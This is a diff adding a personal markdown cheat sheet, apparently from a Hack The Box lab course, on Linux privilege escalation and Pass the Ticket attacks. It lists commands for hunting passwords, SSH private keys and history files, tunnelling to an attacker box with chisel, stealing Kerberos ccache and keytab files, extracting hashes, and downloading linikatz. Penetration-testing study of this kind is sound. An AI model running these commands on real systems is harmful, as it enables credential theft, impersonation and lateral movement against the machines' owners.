@@ -1,0 +1,206 @@
+---
+title: linux privilege escalation
+---
+
+# linux privilege escalation
+
+- tools
+    - [linenum](https://github.com/rebootuser/LinEnum)
+  
+
+- attack
+    - about me
+        - `whoami`
+        - check path `echo $PATH`
+        - environment variables, looking for saved creds
+            - `env`
+        - 
+    - identify OS
+        - looking for age of os, lts versions may contain less kernel vulnerablities 
+        - `hostnamectl`
+        - `cat /etc/os-release`
+        - `lsb_release -a`
+    - identify kernel
+        - `uname -r`
+        - `cat /proc/version`
+        - `hostnamectl | grep Kernel`
+    - identify networks
+        - `ifconfig`
+        - `ip -a`
+        - routing table
+            - `route`
+            - `netstat -rn`comms
+        - dns
+            - `cat /etc/resolv.conf`
+        - hosts target has been talking to
+            - `arp -a`  
+    - identify cpu
+        - `lscpu`
+    - identify services
+        - `ps aux`
+        - as root `ps aux | grep root`
+    - identify shells
+        - `cat /etc/shells`
+    - identify installed packages
+        - `apt list --installed`
+    - logged in users
+        - `who`
+        - `w`
+        - `users`
+    - identify groups
+        - `cat /etc/group`
+        - list users of a group
+            - `getent group sudo`
+    - home directories
+        - `ls /home`
+        - check `.bash_history` for each dir
+    - logged in account
+        - check history `history`
+        - look for ssh keys id_rsa `ls -l ~/.ssh`
+        - sudo privileges `sudo -l`
+        - elevate to sudo `sudo su`
+    - content keyword search
+        - `grep --color=auto -rnw '/home/kali' -ie "Password" --color=always 2>/dev/null`
+    - /etc/passwd 
+        - looking for password hashes which can be cracked
+            - `cat /etc/passwd`
+        - users with login shells
+            - `grep sh$ /etc/passwd`
+            - 
+    - cron jobs
+        - `ls -la /etc/cron.daily/`
+    -  file systems and additional drives
+        -  `lsblk`
+    -  find writable 
+        -  directories `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`
+        -  files `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`
+    -  identify printers 
+        -  `lpstat`
+    -  identify mounted or unmounted drives
+        -  `cat /etc/fstab`
+        -  mounted file systems `df -h`
+        -  unmounted file systems `cat /etc/fstab | grep -v "#" | column -t`
+    -  find hidden
+        -  directories `find / -type d -name ".*" -ls 2>/dev/null` 
+        -  files `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student`
+    -  temp files
+        -  `ls -l /tmp /var/tmp /dev/shm`
+    -  find files
+        -  `cd / && find / -name *.sh 2>/dev/null | xargs cat | grep "HTB"`
+    -  search
+        -  config files `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done`
+        -  .cnf files `for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done`
+        -  databases `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done`
+        -  txt files `find /home/* -type f -name "*.txt" -o ! -name "*.*"`
+        -  scripts `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done`
+        -  cron jobs `cat /etc/crontab`
+        -  private ssh keys `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"`
+        -  public ssh keys `grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"`
+        -  history `tail -n5 /home/*/.bash*`
+        -  logs `for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done`
+        -  firefox stored credentials `ls -l .mozilla/firefox/ | grep default `
+
+
+- Pass the Ticket (PtT) from Linux
+    - Linux connected to Active Directory commonly uses Kerberos as authentication
+    - to attack we need
+        - KRB5CCNAME environment variable is set to the ccache file we want to use `export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133`
+        - to be able to connect to the domain controller
+            - [kali] -> [foothold] -> [domaincontroller]
+            - add foothold machine to /etc/hosts `172.16.1.5  ms01.inlanefreight.htb  ms01`
+            - modify proxychains configuration file to use socks5 and port 1080 `cat /etc/proxychains.conf`
+                - `[ProxyList]`
+                - `socks5 127.0.0.1 1080`
+            - setup chisel on kali
+                - `wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz`
+                - `gzip -d chisel_1.7.7_linux_amd64.gz`
+                - `mv chisel_* chisel && chmod +x ./chisel`
+                - `sudo ./chisel server --reverse`
+                - `2022/10/10 07:26:15 server: Reverse tunneling enabled`
+            - execute chisel on foothold
+                - `c:\tools\chisel.exe client 10.10.14.33:8080 R:socks`
+            - execute proxychains on kali
+                - impacket
+                    - `proxychains impacket-wmiexec dc01 -k`
+                        - must specify hostname of dc
+                        - must use option `-k`
+                        - disable password prompt `-no-pass`
+                - evil-winrm
+                    - get kerberos authentication package
+                        - `sudo apt-get install krb5-user -y`
+                            - set domain name=`INLANEFREIGHT.HTB` and KDC=`DC01`
+                        - if the package is already installed we need to udpate the configuration
+                            - `cat /etc/krb5.conf`
+                            - 
+                                ```sh 
+                                [libdefaults]
+                                        default_realm = INLANEFREIGHT.HTB
+                                <SNIP>
+                                [realms]
+                                    INLANEFREIGHT.HTB = {
+                                        kdc = dc01.inlanefreight.htb
+                                    }
+                                <SNIP>
+                                ```
+                        - now execute
+                        - `proxychains evil-winrm -i dc01 -r inlanefreight.htb`
+                        - 
+    - lets find tickets
+        - commonly stored in [credential cache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html)
+        - Kerberos tickets as ccache files in the /tmp directory
+        - the environment variable KRB5CCNAME can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed
+        -  ccache files are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets
+    -   keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files. Keytab files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file
+    -   Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.
+    - ssh
+        - `ssh david@inlanefreight.htb@10.129.204.23 -p 2222`
+    - check if domain joined 
+        - `ps -ef | grep -i "winbind\|sssd"`    
+        - or `realm list`
+    - keytabs
+        - can be used to impersonate users
+        - *note* To use a keytab file, we must have read and write (rw) privileges on the file.
+        - *note* a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account `LINUX01$.INLANEFREIGHT.HTB`
+        - `find / -name *keytab* -ls 2>/dev/null` 
+        - find in cron jobs
+            - find keytab references
+                - `crontab -l`
+                - look for references to executable scripts
+                    - eg `*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh`
+        - [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html)
+            - allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use kinit to import a keytab into our session and act as the user
+        - [klist](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist)
+            - Displays a list of currently cached Kerberos tickets.
+        - impersonating a user
+            - `klist`
+            - `kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab`
+            - `klist`
+            - smb connection `smbclient //dc01/carlos -k -c ls`
+        - extract the secrets from a keytab file
+            - [keytabextract](https://github.com/sosdave/KeyTabExtract)
+                - will extract information such as the realm, Service Principal, Encryption Type, and Hashes
+                - `python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab`
+                - NTLM hash, we can perform a Pass the Hash attack
+                - AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack
+                - 
+    - ccache files
+        - credential cache or ccache file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the `KRB5CCNAME` environment variable
+        - only readable to root and the owner of the file
+        - check environment variables
+            - `env | grep -i krb5`
+        - look for ccache files `ls -la /tmp` where tickets have not expired    
+            - identify interesting groups users belong too `id julio@inlanefreight.htb`
+            - copy the ccache file `cp /tmp/krb5cc_647401106_I8I133 .`
+            - set the env variable `export KRB5CCNAME=/root/krb5cc_647401106_I8I133`
+            - verify `klist`    `Default principal: julio@INLANEFREIGHT.HTB`
+            - script `sudo cp /tmp/krb5cc_647401106_sHU30F . && sudo chown svc_workstations@inlanefreight.htb /home/svc_workstations@inlanefreight.htb/krb5cc_647401106_sHU30F && export KRB5CCNAME=home/svc_workstations@inlanefreight.htb/krb5cc_647401106_sHU30F && klist`
+    - convert ccache to kirbi vice vulnerablities
+        - linux ccache to kirbi
+            - `impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi`
+            - `C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi`
+    - [linikatz](https://github.com/CiscoCXSecurity/linikatz)
+        - created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory
+        - mimikatz for unix 
+        - download `wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh`
+        - exec `/opt/linikatz.sh`
+    - 
